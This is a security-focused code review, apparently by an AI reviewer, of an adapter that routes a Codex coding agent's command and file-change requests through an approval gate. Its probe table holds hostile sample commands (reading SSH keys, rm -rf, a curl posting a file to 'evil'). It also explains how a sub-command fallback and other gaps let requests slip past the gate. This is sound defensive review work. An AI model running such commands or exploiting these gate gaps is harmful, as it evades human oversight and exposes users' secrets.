# Review: M1-08-codex-adapter (commit 02fef1b)

Reviewer: Claude Opus 5.5, read-only (D-088). Author: Gemini 4 Hydrogen `high`. Builds, probes, the trial merge and mutations ran in a scratch clone; no real `codex` or other provider was run.

## Verdict: approve with changes

The approval path follows the Claude adapter's model. Every `Ask` is redeemed through `gate.redeem` with a check rebuilt from the provider's stored request before Codex is answered. A check `Allow` is the only other accept path. There is no path that answers a command or file-change request without a gate decision. `commandExecution` is always `Execute` with a `Command` subject, and Home threads run `read-only` + `untrusted`. The X6 violations are gone, and the saturation and process-group tests are real.

Four things need fixing before merge:
1. A fallback in command extraction can build the check from only the first parsed sub-command, which reaches `Allow`.
2. The branch doesn't compile against current `dev`, because `DeclineQuestion` isn't handled.
3. Two approval-path mutations survive.
4. Some provenance and recorder gaps go against the contract or against what M0 recorded.

## 1. Toolchain (scratch clone of 02fef1b)
- `cargo fmt --all --check`: clean.
- `cargo clippy --workspace --all-targets -- -D warnings`: clean.
- `cargo test -p atrium-agents`: all pass. Counts:
  - lib 32;
  - claude_adapter 38, claude_golden 20, claude_normalizer 60, claude_policy_e2e 5, claude_review 28;
  - codex_adapter 12, codex_golden 7, codex_normalizer 9, codex_policy_e2e 3;
  - consistency 11 (1 ignored).
- `cargo test -p atrium-agents --test consistency -- --ignored`: `consistency_all_fixtures ... ok`. It scans `fixtures/agents/{claude,codex}`, so there are no Codex violations (X6).
- The 11 `*-startup-failure` goldens and `startup-error` are exactly `[error, session_ended]`. Each startup-failure golden carries 3 `details` lines. The hand-made `interrupt` now closes in order (… `tool_call_finished`, `request_resolved`, `turn_completed`, `session_ended`).
- `consistency.rs:1204` still has `#[ignore = "M1-07, M1-08: …"]`. That file isn't M1-08's, so the orchestrator should un-ignore it at merge (X6 says the test must gate M1).

## 2. Trial merge of `dev` (600b2c3)
- The merge is clean textually but **doesn't compile**: `E0004 non-exhaustive patterns: SessionCommand::DeclineQuestion` at `codex/adapter.rs:1347` and `codex/normalizer.rs:1396`.
- With a stub arm in both places, the whole `atrium-agents` suite passes on the merged tree. The dev-side changes to `fixture.rs` and the Claude adapter don't affect the Codex goldens.
- **What the Codex adapter must do for `DeclineQuestion`** (§6.2 rev 3.1, D-091):
  - Remove the pending question by its ticket id.
  - Give Codex its own "dismissed" reply. For `item/tool/requestUserInput` that is `{"id": raw, "result": {"answers": {}}}`, the same reply the adapter already sends when no ticket can be had (`adapter.rs` `Internal::Question`, `None` arm).
  - The normalizer emits `RequestResolved { outcome: Cancelled }`, and the turn goes on.
  - Live Codex hasn't shown that it treats empty answers as a dismissal (that's X2). If it errors or wedges on them, use the D-091 fallback instead: `RequestResolved { Cancelled }`, then `Error { fatal: false }` saying Codex can't dismiss a question, then `turn/interrupt`.
  - Add a `question` scenario that declines to `codex-fake`, and a "decline" step to LIVE.md's X2 section.
  - Handle an unknown id like `AnswerQuestion` does (a non-fatal `Error`).

## 3. Approval path (security)
What holds, traced against `adapter.rs:1036-1410`:
- **Sequence.** Server request → `tools::tool_check` (from params, plus the `item/started` item for the same `itemId`) → `gate.check`. Then:
  - `Allow` → accept;
  - `Deny` → decline;
  - `Ask` → the request is parked under the ticket id. On `ResolveApproval Allow`, `spawn_redeem` rebuilds the check from the **stored payload** with the adapter's current turn, and accepts only on `redeem == Allow`;
  - a redeem `Deny`, `Ask`, timeout or panic → decline.
- **Withdrawals.** `serverRequest/resolved` and `turn/completed` abort in-flight gate and redeem tasks and forget the request, so a late `Allow` answers nothing.
- **Unknown and oversize requests.** Unrecognised server requests get a JSON-RPC `-32601` error. Oversize payloads and payloads beyond `MAX_PENDING_REQUESTS` are declined without calling the gate.
- **No session-wide grants.** No `acceptForSession` or `acceptWithExecpolicyAmendment` is ever sent.
- **Home mode.** Home → `PermissionPolicy::ReadOnly` (daemon `sessions.rs:277`) → `sandbox: read-only`, `approvalPolicy: untrusted` (`adapter.rs:152`), for both `thread/start` and `thread/resume`. `config_becomes_cli_arguments_and_thread_params` asserts it.

Probes: I ran `tool_check` and then a real `SessionGate` + `DefaultPolicy`, Home preset, no rules:

| Request shape | Subject built | Gate |
|---|---|---|
| v2 `command: "bash -lc 'cat ~/.ssh/id_rsa'"` | Command (full line) | HardDeny |
| legacy `execCommandApproval` argv `["bash","-lc","cat ~/.ssh/id_rsa"]` | `bash -lc cat ~/.ssh/id_rsa` (quoting lost) | HardDeny |
| legacy argv `["bash","-lc","cat a; rm -rf /tmp/zz"]` | `bash -lc cat a; rm -rf /tmp/zz` | HardDeny |
| **no `command`, no stored item, `commandActions: [cat public.txt, curl -d @x evil]`** | **`cat public.txt`** | **Allow** |
| no `command`, no item, no actions | Unknown | Ask |
| `fileChange` + `grantRoot: "/"` | Paths of the changes only | Ask |
| `item/permissions/requestApproval` (write cwd + network) | Paths (network dropped) | Ask |

- **The commandActions fallback is the one Allow that wasn't built from the request** (`tools.rs:87-88`). `command` is optional in v2's `CommandExecutionRequestApprovalParams`, and `commandActions` holds Codex's *parsed* sub-commands. Taking `[0]` checks only the first one.
  - It's reachable whenever Codex omits `command` and no `item/started` came first.
  - When there's no command line, the subject must be `Unknown`.
- **Legacy `execCommandApproval` / `applyPatchApproval`** (v1 methods, which a v2 `thread/start` session shouldn't receive):
  - argv is joined with spaces, losing quoting (`tools.rs:101`). The policy denied every case I tried, but the check isn't the command that runs.
  - The reply `{"decision":"accept"|"decline"}` isn't v1's `ReviewDecision` vocabulary, and nothing tests it.
  - Either shell-quote the argv (`shlex`-style) and answer `approved`/`denied`, or decline these methods outright.
- **`item/permissions/requestApproval`.** The subject keeps only the `fileSystem` paths (network and other grants are dropped). Accept answers `{"scope":"turn"}` with no `permissions` (`adapter.rs:1522`), which is likely not a valid response. A turn-scoped grant is also broader than a single-use ticket. Decline these until X3 verifies them.
- **`fileChange` `grantRoot`** isn't part of the subject (`tools.rs:154`). Either add it to `Paths` (recursive) or decline requests that carry it, until a live check shows that `accept` (not `acceptForSession`) doesn't extend the writable roots.
- **Duplicate native ids** (hardening; Codex picks the ids, the model doesn't). A second request reusing a live id overwrites `approvals["pending:N"]`. The first gate result is then applied to the second request's metadata (`adapter.rs:1081/1130`). Decline a request whose id is already in `live`.

## 4. Goldens and fixtures
- **Coverage.** All 30 goldens (25 recorded + 5 hand-made) are regenerated and match `normalize(inputs)`: `every_scenario_matches_its_golden_file` passes.
- **Hand-made marking.** The hand-made five stay under `handmade/`, and their `.md` says "hand-made … demonstrate mapping only".
- **f0b1aab `.jsonl` edits.** No `stdin` or `stdout` line (recorded provider data) changed. The edits touch only Atrium-side records:
  - the existing `"dir":"gate"` lines in `gate-deny`, `gate-deny-execute`, `approval-allow`, `approval-deny`, `tool-read` and hand-made `approval-allow`, `interrupt`, `patch` were **rewritten**: `subject` added, and `gate-deny`'s `kind: read` became `execute`;
  - one `question_ticket` line was added to `handmade/question.jsonl`.
- Two problems with those edits:
  - The handoff says it *added* metadata lines "without altering" anything, which understates the rewrite. The fixtures' `.md` provenance doesn't mention it.
  - The rewritten subjects carry `"cwd": null`. The M1 adapter would record `cwd: "/scratch"` from the request's `cwd` field, and the sanitizer doesn't null it. So these gate records are synthetic, not what this adapter produces.
- **Enforcement in replay.** No fixture contains an `enforcement` record. Replay falls back to `default_enforcement(userAgent version)`, which has no config sources. That's acceptable until the live re-records, but it should be noted in `LIVE.md`.

## 5. Saturation and process groups: real
- `saturation_unread_events_still_obey_interrupt_and_shutdown`:
  - fills the event channel to `max_capacity()` (asserted) with a grandchild alive in the group;
  - shows `Interrupt` reaches the fake (marker file) within `SHUTDOWN_GRACE`, and `Shutdown` closes the command channel within the grace;
  - checks that leader, grandchild and group are gone;
  - then drains the events: exactly one `SessionEnded`, last, with contiguous seqs.
- `start_dropped_and_leader_exits_kill_process_group`:
  - `on_spawn` fires before the handshake;
  - after a handshake failure the grandchild dies and the group is empty.
  - **[nit]** It's a failed `start`, not a *dropped* `start` future, despite the name. `Proc::drop` → `terminate_blocking` on a helper thread covers the drop case, but no test drops the future mid-handshake.
- **Spawning.** Spawn goes through `supervise::spawn_group`, `Session::process` is set, and there's no respawn path.
- **[moderate] Dropped events.** `enqueue_events` silently drops non-terminal events once `pending ≥ PENDING_LIMIT` (`adapter.rs:688`). That includes `ApprovalRequested`, `QuestionAsked` and `ToolCallStarted`. Stdout is paused at that limit, but gate, redeem and command results can still push past it. A dropped `ToolCallStarted` with a kept `ToolCallFinished` breaks consistency; a dropped `ApprovalRequested` leaves a ticket the user never sees (it fails closed, but the request hangs). Either hold these past the limit, as Claude's adapter does for active work (`claude/adapter.rs:995`), or end the session fatally.

## 6. Descriptor
- **Coverage (`normalizer.rs:33`).** Read and Execute are `ProviderGated`; Edit, Delete, Move, Search, Mcp and ProviderSpecific are `Unknown`; Fetch and Subagent are `NotIntercepted`. So the level is always Partial, as required. `tested_versions = ["0.163.0"]` matches the fixtures' `userAgent`.
- **ConfigSources.** They're built at run time from `CODEX_HOME` or `HOME/.codex`: `config.toml`, `hooks.json`, the active profile (from `-p`, `--profile`, `-c profile=` or `profile =`) as `<file>#profiles.<name>`, the project `.codex/config.toml` and `hooks.json`, and `/etc/codex/config.toml`. Unreadable or unparsable files count as uninspected.
- Gaps:
  - **[moderate] Wrong hooks key.** The hooks feature is checked as `features.codex_hooks` (`settings.rs:178`). M0 recorded and documented the key as **`features.hooks`** (`docs/spikes/M0-02-codex-adapter.md:255`), so `[features] hooks = true` doesn't add `ExternalHooks`. M0's recorder also passed `-c features.hooks=false`; M1 doesn't.
  - **[moderate] Rules and plugins not recorded.** `~/.codex/rules/*.rules` isn't recorded. M0's matrix flags these "allow-prefixes may bypass provider requests" (§ table row "User `.rules`"). Codex plugins (`~/.codex/plugins`, plugin MCP and hooks) aren't recorded either, though §3 says "every settings file, plugin directory and managed policy".
  - **[minor] Managed policy and project walk-up.** Only `/etc/codex/config.toml` is checked; add `managed_config.toml` and `requirements.toml`, and macOS managed preferences if possible. The project config is read only at `cwd`, not up to the repo root. `notify`, a key that runs a command, adds no `ExternalHooks`. Consider `config/read` with `includeLayers` to list the layers Codex actually loaded.
  - **[moderate] Effective policy not verified.** The `thread/start` and `resume` response echoes the effective `approvalPolicy` and `sandbox`, but the adapter never compares them with what it asked for (`adapter.rs:749`). If a managed requirement or a CLI change overrides `untrusted`/`read-only`, the descriptor doesn't change. Refuse the start, or add a reason.
  - **[minor] FullAccess coverage.** `coverage()` is the same under FullAccess (`approvalPolicy: never`), where nothing is provider-gated. The level stays Partial, but the reasons ("Execute calls: ProviderGated") are wrong for that session.

## 7. Scope and dependency
- Every path is owned. `lib.rs` has the one-line `pub mod codex; // M1-08`, `Cargo.toml` adds one line `toml = "0.8" # M1-08`, and `Cargo.lock` adds `"toml 0.8.2"` to `atrium-agents`' dependencies. `toml 0.8.2` was already in the lock, so no new crate is fetched.
- **`toml` is justified:**
  - it parses `config.toml` for profiles and hooks;
  - it encodes the `-c mcp_servers.<name>.*` overrides as TOML literals (Codex parses `-c` values as TOML). The names are validated to `[A-Za-z0-9_-]`, so no key injection.
  - **[minor]** MCP `env` values end up in Codex's argv, which other same-user processes can see. That's the same-UID limit already stated, but worth a line in the handoff.

## 8. Live harness (`codex-record`, `LIVE.md`)
- **[moderate] Recorder mode.** The recorder runs every scenario under `PermissionPolicy::Ask` (`workspace-write`) or FullAccess (`codex-record.rs:437`), never under **ReadOnly**, which is Home's mode (D-050) and what M0 recorded. The X1 probes would then measure a mode Home doesn't use. Default to ReadOnly, and keep `Ask` as an explicit variant.
- **[moderate] X1–X3 mislabelled.** `LIVE.md` names them differently from `m1-must-fix.md`, which defines them as:
  - X1 = re-record `patch` (file-change approval);
  - X2 = the question mode;
  - X3 = the MCP row, plus the `preToolUse` hook and granular-policy options.

  LIVE.md's X2 is FullAccess and its X3 is exec amendment. There's no granular or `preToolUse` probe. `x1-question`, cited in the handoff, isn't a scenario. `x1-mcp` runs with `mcp_servers: Vec::new()`, so it can't exercise MCP. Also missing: probes for question decline, `grantRoot`, `.rules` allow-prefixes and `features.hooks`.

## Mutation results (3 runs each)

Suites: codex_adapter, codex_policy_e2e, codex_normalizer, codex_golden, lib.

| Mutation | Result |
|---|---|
| M1: a redeem `Deny` still answers Codex `accept` (`adapter.rs` `Internal::Redeem`) | **NOT caught** (3/3 green) |
| M2: `ResolveApproval Allow` accepts directly, skipping `gate.redeem` | caught: `gate_allow_deny_and_redeem_flow` (3/3) |
| M3: `commandExecution` → `ToolKind::Read`, Command override removed | caught: lib `command_execution_with_read_action_is_always_execute_command`; also `gate_allow_deny_and_redeem_flow` and 3 `codex_golden` tests |
| M4: redeem check built from `{}` instead of the stored request | **NOT caught** (3/3 green) |

- **M1 survives** because the redeem-deny test only asserts that the *normalizer* emitted `ToolCallFinished Denied`, which it does from `AdapterInput::Redeem` whatever the adapter writes. `codex-fake` already decides `completed` or `declined` from the reply, so assert on that (the audit or the fake's `item/completed` status), or on the `stdin` reply.
- **M4 survives** because `TestGate.redeem` never compares the redeem check with the gate check. Assert that `redeems[0].1` has the same subject, input and turn as the original check.

## Findings
- **[blocker] Doesn't compile on `dev`.** `SessionCommand::DeclineQuestion` isn't handled (`adapter.rs:1347`, `normalizer.rs:1396`); implement it as in §2.
- **[major] `tools.rs:87-88`:** with no `command`, the line falls back to `commandActions[0].command`, a partial parsed sub-command. That reaches `Allow` in Home for `cat …` while the real command does more. Return `Unknown` instead.
- **[moderate] Surviving mutations M1 and M4:** add the reply-side and same-check asserts (`tests/codex_adapter.rs:494`).
- **[moderate] Legacy `execCommandApproval` / `applyPatchApproval`** (`tools.rs:101`, `adapter.rs:1519`): argv is joined without quoting, and the replies use v2 vocabulary. Decline these methods, or quote the argv and answer in `ReviewDecision` terms, with a test either way.
- **[moderate] `item/permissions/requestApproval`** (`tools.rs:193`, `adapter.rs:1522`): the subject drops network and other grants, accept omits `permissions`, and the grant is turn-wide. Decline until X3.
- **[moderate] `fileChange` `grantRoot` ignored** (`tools.rs:154`): add it to the subject, or decline requests that carry it.
- **[moderate] Wrong hooks key** (`settings.rs:178`): `features.codex_hooks` should be `features.hooks`, per M0.
- **[moderate] Missing config sources** (`settings.rs:36-70`): `~/.codex/rules/*.rules` and the plugin directories aren't recorded.
- **[moderate] Effective policy not checked** (`adapter.rs:749`): the `approvalPolicy`/`sandbox` from the `thread/start`/`resume` response isn't compared with the request.
- **[moderate] Dropped events** (`adapter.rs:688`): non-terminal events, approvals and questions included, are dropped past `PENDING_LIMIT`.
- **[moderate] Recorder never uses ReadOnly** (`codex-record.rs:437`), Home's mode.
- **[moderate] `LIVE.md`'s X1–X3 don't match `m1-must-fix.md`;** the granular, `preToolUse`, MCP-server, question-decline, `grantRoot` and `.rules` probes are missing.
- **[minor] Rewritten gate records:** the f0b1aab gate lines were rewritten, not just added. The handoff understates it, `.md` provenance is silent, and the rewritten subjects have `cwd: null` where the adapter would record `/scratch`.
- **[minor] Managed config:** `managed_config.toml`, `requirements.toml` and the project walk-up aren't inspected; `notify` isn't flagged.
- **[minor] FullAccess coverage:** `coverage()` is the same under FullAccess, so the reasons are wrong for those sessions.
- **[minor] Duplicate native ids:** a second request reusing a live id isn't declined (`adapter.rs:1081`).
- **[minor] MCP env in argv:** MCP `env` values are visible in Codex's argv; note it in the handoff.
- **[nit] Test name:** `start_dropped_and_leader_exits_kill_process_group` tests a failed start, not a dropped future.
- **[nit] Ignored consistency test:** un-ignore `consistency_all_fixtures` at merge (not M1-08's file).

## Asked before merge
1. Handle `DeclineQuestion` (empty `answers`, then `RequestResolved Cancelled`; or the D-091 fallback), with a `codex-fake` test. Rebase or merge onto `dev`.
2. Remove the `commandActions[0]` fallback (`Unknown` instead), with a test.
3. Kill mutations M1 and M4 (the reply-side assert and the same-check assert).
4. Decline `execCommandApproval`/`applyPatchApproval`, `item/permissions/requestApproval`, and `fileChange` requests with `grantRoot`, until they are mapped and live-verified (or map them correctly).
5. Fix the hooks key (`features.hooks`); record `rules/` and the plugin directories as config sources; compare the effective `approvalPolicy`/`sandbox` from the `thread/start` response.
6. Stop dropping non-terminal events past `PENDING_LIMIT`.
7. Recorder and `LIVE.md`: default to ReadOnly, relabel X1–X3 to match `m1-must-fix.md`, and add the missing probes.
8. Correct the handoff and `.md` provenance about the rewritten gate records.

The minor items and nits can go with the fix round or into the follow-up list.
